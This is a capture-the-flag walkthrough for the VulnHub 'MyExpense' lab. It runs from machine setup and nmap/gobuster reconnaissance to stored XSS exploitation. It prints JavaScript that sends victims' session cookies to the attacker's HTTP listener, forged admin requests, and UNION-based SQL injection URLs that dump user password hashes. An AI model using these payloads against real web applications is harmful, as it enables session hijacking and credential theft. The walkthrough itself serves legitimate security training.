# Machine Preparation
Firts, download the *.ova* image from source [MyExpense - VulnhHub](https://www.vulnhub.com/entry/myexpense-1,405/).
Then, import the image to VMware.
## Changing the Network Adapter
Now, I have a NAT interface to manage machines into a subnet, like this.
![[Pasted image 20230629131917.png]]
We must connect this *VMnet0* with the attacker device and victim device.
![[Pasted image 20230629132035.png]]
____
## Changing the Network Interface
- [^1] In the grub screen press key: **E**.
	![[Pasted image 20230629132737.png]] ![[Pasted image 20230629132808.png]]
 ____
- [^2] Then, move down and change: **ro quiet** for **rw init=/bin/bash** and pess **Ctrl+x** to restart the machine.
	![[Pasted image 20230629133019.png]] ![[Pasted image 20230629153955.png]]
 ____
- [^3] We can see that the interface is incorrect. So we change it.
	![[Pasted image 20230629133653.png]]
	![[Pasted image 20230629133905.png]]
	Now in attacker device we can see the machine in our network.
	![[Pasted image 20230629134134.png]]
 ____
- [^4] After, we should change a few scripts, so we must repeat the steps **1** and **2**, then, we must change in each script at */opt/*.
	![[Pasted image 20230629134838.png]]
	Change *get_ip_address* for the IP assigned by DHCP.
	![[Pasted image 20230629135108.png]]
 ____
- [^5] Finally, restart the machine and hack!. 
____
# Scenario Context
You are "Samuel Lamotte" and you have just been fired by your company "Furtura Business Informatique". Unfortunately because of your hasty departure, you did not have time to validate your expense report for your last business trip, which still amounts to 750 € corresponding to a return flight to your last customer.
Fearing that your former employer may not want to reimburse you for this expense report, you decide to hack into the internal application called **"MyExpense"** to manage employee expense reports.
So you are in your car, in the company carpark and connected to the internal Wi-Fi (the key has still not been changed after your departure). The application is protected by username/password authentication and you hope that the administrator has not yet modified or deleted your access.
Your credentials were: samuel/fzghn4lw
Once the challenge is done, the flag will be displayed on the application while being connected with your (samuel) account.

We save this initial credentials.
![[Pasted image 20230629162538.png]]
____
# Reconnaissance
Detecting system operative, this returns TTL=64 for linux OS.
The IP is: **192.168.200.131**.
```shell
sudo arp-scan -I ens33 --localnet --ignoredups
```
____
Using a custom tool.
```shell
which whichSystem.py
whichSystem.py 192.168.200.131
```
____
Port scanning by using *nmap*.
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.200.131 -oG allPorts
```
- -p-: All ports (65535).
- --open: Show open ports.
- -sS: Half-open scanning technique.
- --min-rate 5000: min rate of sent packets is 5000.
- -vvv: Triple verbose.
- -n: No DNS resolution.
- -Pn: No Host discovery, the IP sent is taken as valid or existing.
- -oG: Output is saved as Grepable in *allPorts* file.
____

*Custom script to extract information from the grepable output.*
```bash
# to create work directories
function mkt() {
  mkdir {nmap,content,exploits}
}

# to extract information from grepable nmap output
function extractPorts() {
	ports="$(cat $1	| grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '^Host: .* \(\)' | head -n 1 | awk '{print $2}')"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	cat extractPorts.tmp
	rm extractPorts.tmp
}
```
____
Using extractPorts to retrieve information from nmap scan.
```shell
extractPorts allPorts
```
____
The printed ports of above execution we paste them in nmap like this.
```shell
sudo nmap -sCV -p80,38789,39457,40685,58593 192.168.200.131 -oN targeted
```
- -sCV: Applies *service* scanning and executes a few *scripts* to recognize more data about those services.
- -p80,38789,39457,40685,58593: Ports returned by before nmap scan.
- -oN: Output is saved as Nmapable in *targeted* file (simply, as nmap output).
____
Output nmap scan.
![[Pasted image 20230629162010.png]]
____
Let's probe initial credentials *samuel/fzghn4lw*.
![[Pasted image 20230629162907.png]]
____
Using brute force to find out directories by using *gobuster* tool.
```shell
gobuster dir -u http://192.168.200.131/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
```
- dir: Directory brute force.
- -u: URL.
- -w: Dicctionary to be used, I use [SecLists](https://github.com/danielmiessler/SecLists).
We found **/admin/** directory.
![[Pasted image 20230629163517.png]]
____
But it seems that we need be an administrator to see the content.
![[Pasted image 20230629163654.png]]
____
Now, let's see if the website uses *php* into */admin/* directory by using **gobuster** tool again.
```shell
gobuster dir -u http://192.168.200.131/admin -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```
- -t 20: Apply 20 threads.
- -x php: to find out *php* files into */admin/* directory.
We found **/admin/admin.php** file.
![[Pasted image 20230629164520.png]]
____
We can see all users of the organization and that the *slamotte* (Samuel) user is **Inactive**.
![[Pasted image 20230629164658.png]]
____
We are going to update our *credts.txt* file.
![[Pasted image 20230629165331.png]]
But trying with new credentials, the web says.
![[Pasted image 20230629165756.png]]
____
## Trying User Creation
We try create a new user to see if the web is XSS insecure, but the web says.
![[Pasted image 20230629170828.png]]
But, this is HTML and we could edit this code, delete *disabled=""* to enable **Sing up !** button.
![[Pasted image 20230629171018.png]]
![[Pasted image 20230629171157.png]]
![[Pasted image 20230629171220.png]]
____
## Verifying XSS Vulnerability
We have injected *javascript* code to see if  the web is XSS vulnerable, let's view if this is TRUE.
![[Pasted image 20230629171547.png]]
____
Now, any authenticated user that sees this panel will execute the injected script.
## Attacking with XSS
We inject a script to retrieve a connection from anyone that sees the *admin.php* panel.
![[Pasted image 20230629172414.png]]
____
### Cookie Hijacking
Now we can do a *Cookie Hijacking* with the next script into *pwned.js*.
Starting a Http listener server.
```shell
sudo python3 -m http.server 80
```
____
Content of *pwned.js*.
```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.200.128/?cookie=' + document.cookie);
request.send();
```
____
You can see that some user that sees the */admin/admin.php* panel is sending his cookie to us.
![[Pasted image 20230629173021.png]]
____
We use this captures cookie: *h716aj84eo0ihr3e42a3tr0ij5* to see if we can hijack it.
![[Pasted image 20230629173359.png]]
This cookie belongs to an administrator, and this only can be used in one session.
![[Pasted image 20230629173618.png]]
___
### Doing Things as Administrator
To **active** an account, when we click on the *active* button, It sends this in the URL.
```URL
http://192.168.200.131/admin/admin.php?id=11&status=active
```
____
So we can use this *GET* request in out *pwned.js* script so the administrator active the *samuel* user, just like this.
```shell
sudo python3 http.server 80
```
____
```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.200.131/admin/admin.php?id=11&status=active');
request.send();
```
____
And now, the *samuel* user is **actived**.
![[Pasted image 20230629174743.png|700x400]]
____
We login in with *samuel* credentials now, because his account is *actived*.
Also, we can see that a few users are chating.
![[Pasted image 20230629181356.png]]
____
In the **Expense reports**, you can see that the expense value hasn't been paid.
![[Pasted image 20230629181749.png]]
____
## Forcing Expense Payment
First, we send the report for our payment, this has been submitted but not approved.
![[Pasted image 20230629181956.png]]
____
Second, you can see that our manager is **Manon Riviere** maybe he should approve our report.
![[Pasted image 20230629182606.png]]
____
### Cookie Hijacking Directed to Manon Riviere
So, we must be **Manon Riviere** to accept our report, and we could inject another script to do a *Cookie Hijacking* to try to get his cookie.
```shell
sudo python3 -m http.server 4646
```
____
*cookieHijacking.js*
```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.200.128:4646/?cookie=' + document.cookie);
request.send();
```
____
Inject code for any user that sees the malicious code sends to us his session cookie.
![[Pasted image 20230629184136.png]]
____
Let's try out all of this cookies.
![[Pasted image 20230629184806.png]]
____
This cookie belongs to out manager and we are going to aprove our expense.
![[Pasted image 20230629185000.png]]
____
Now, as *samuel* user, we can see that our expense has been validated, but no sent for payment.
![[Pasted image 20230629185248.png]]
____
Also, we can see the boss of **Manon Riviere** is **Paul Baudouin** and he is the *Financial approver*.
![[Pasted image 20230629185719.png]]
![[Pasted image 20230629185824.png]]
____
### SQL Injection to Retrieve Paul Password
So, any cookie hijacked doesn't contains the **Paul Baudouin** user.
But this user conaints a panel that sends *queries* to main database, we can use this feature to retrieve user passwords.
![[Pasted image 20230629190143.png]]
____
Let's verify if the query is between *''* or not.
```URL
http://192.168.200.131/site.php?id=2'-- -
```
![[Pasted image 20230629191110.png|1000x300]]
____
So, the query doesn't between *''*.
```URL
http://192.168.200.131/site.php?id=2-- -
```
![[Pasted image 20230629191218.png]]
____
To retrieve the number of columns, we probe.
```URL
(this returns error)
http://192.168.200.131/site.php?id=2 order by 3-- -
(this doesn't return error)
http://192.168.200.131/site.php?id=2 order by 2-- -
```
____
Also, we can do.
```URL
http://191.168.200.131/site.php?id=2 union select 1,2-- -
```
![[Pasted image 20230629192748.png]]
____
Now, we could obtain a lot of information into database by using the following queries.
- To see database names.
```URL
http://192.168.200.131/site.php?id=2 union select 1,schema_name from information_schema.schemata-- -
```
____
- To see tables of *myexpense* database.
```URL
http://192.168.200.131/site.php?id=2 union select 1,table_name from information_schema.tables where table_schema='myexpense'-- -
```
____
- To see columns of *user* table of *myexpense* database.
```URL
http://192.168.200.131/site.php?id=2 union select 1,column_name from information_schema.columns where table_schema='myexpense' and table_name='user'-- -
```
____
- To see users and passwords concatenated (assuming that *myexpense* database is used).
```URL
http://192.168.200.131/site.php?id=2 union select 1,group_concat(username, 0x3a, password) from user-- -
```
____
Now, with all credentials retrieved, we can crack all of them, but our focuss is in **Paul Baudouin** user.
![[Pasted image 20230629194838.png]]
____
Let's use this [Hashes](https://hashes.com/en/decrypt/hash) web to crack this hash: **64202ddd5fdea4cc5c2f856efef36e1a**.
![[Pasted image 20230629195241.png]]
His password is: **HackMe** 😵.
____
Let's log in with **Paul Baudouin** account and pay our expense.
![[Pasted image 20230629195557.png]]
____
Now, we can retrieve the *FLAG* by loggin in with *samuel* account.
![[Pasted image 20230629195745.png]]
____